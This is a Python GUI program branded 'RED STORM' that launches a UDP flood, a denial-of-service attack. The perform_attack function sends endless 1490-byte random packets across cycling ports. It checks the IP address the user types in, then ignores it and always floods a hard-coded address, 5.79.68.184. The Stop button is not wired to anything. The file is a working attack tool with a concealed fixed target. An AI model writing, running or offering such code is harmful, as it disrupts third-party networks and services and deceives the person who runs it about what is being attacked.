import threading
import customtkinter as ctk
import tkinter as tk
import socket
from tkinter import *
import random
import os
import time

def display_messages(index=0):
    messages = [
        "[i] Do not disconnect from the internet",
        "[+] Verifying the IP address",
        "[+] Preparing UDP packets",
        "[+] The attack has been started",
        "[i] Press stop to end the attack ... ",]

    if index < len(messages):
        color = "yellow" if "[i]" in messages[index] else "green"
        gray_box.create_text(5, 5 + (index * 25), anchor="nw", text=messages[index], fill=color, font=("DejaVu Sans Mono", 13))
        root.after(1500, display_messages, index + 1)

def check_ip():
    ip = IP.get()
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def perform_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    
    if not check_ip():
        print("Please enter a valid IP address.")
        
        return
    
    gray_box.delete("all")
    display_messages()

    os.system("clear")
    pr = "5.79.68.184" 
    ip = pr
    rt = 8080
    port = int(rt) 
    
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print("Sent %s packet to %s through port:%s -by red storm" %
              (sent, ip, port))
        if port == 65534:
            port = 1

def attack():
    threading.Thread(target=perform_attack).start()

modes = ["system", "light", "dark"]
themes = ["blue", "dark-blue", "green"]
ctk.set_appearance_mode("light")
ctk.set_default_color_theme("dark-blue")

def exit_application():
    root.destroy()

def clear_results():
    gray_box.delete("all")

root = tk.Tk()
root.title("KAVEN IP INFO TRD TOOL (zero minute tools)")
root.geometry("1280x800")
root.configure(bg="#1e1e1e")
root.resizable(width=False, height=False)

ascii_label = tk.Label(root, text="""
██████╗ ███████╗██████╗     ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║    ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║    ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
██║  ██║███████╗██████╔╝    ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
""", font=("Courier", 14), bg="#1e1e1e", fg="white")
ascii_label.pack(pady=28)

progress = ctk.CTkEntry(master=root, width=330, placeholder_text='Progress :')
progress.place(x=620, y=245)

gray_box = tk.Canvas(root, bg="#404040", bd=0, highlightthickness=0, width=990, height=510, state="normal")
gray_box.pack(pady=50)

gray_box.create_text(5, 5, anchor="nw", text=">_", fill="red", font=("Courier", 19))
gray_box.place(x=10, y=280)

attack_button = ctk.CTkButton(master=root, text="Attack", width=60, corner_radius=7, command=attack)
attack_button.place(x=317, y=245)

stop_button = ctk.CTkButton(master=root, text="Stop", width=60, corner_radius=7)
stop_button.place(x=940, y=245)

IP = ctk.CTkEntry(master=root, width=310, placeholder_text='Type Router IP : ')
IP.place(x=10, y=245)

profile_button = ctk.CTkButton(master=root, text="New profile", width=220, corner_radius=6)
profile_button.place(x=1035, y=671)

buttons_frame = tk.Frame(root, background="#1e1e1e")
buttons_frame.pack(side="bottom", anchor="se", padx=20, pady=20)

clear_button = ctk.CTkButton(master=buttons_frame, text="Clear", width=220, corner_radius=6, command=clear_results)
clear_button.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")

exit = ctk.CTkButton(master=buttons_frame, text="Exit", width=220, corner_radius=6, command=exit_application)
exit.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")

root.mainloop()
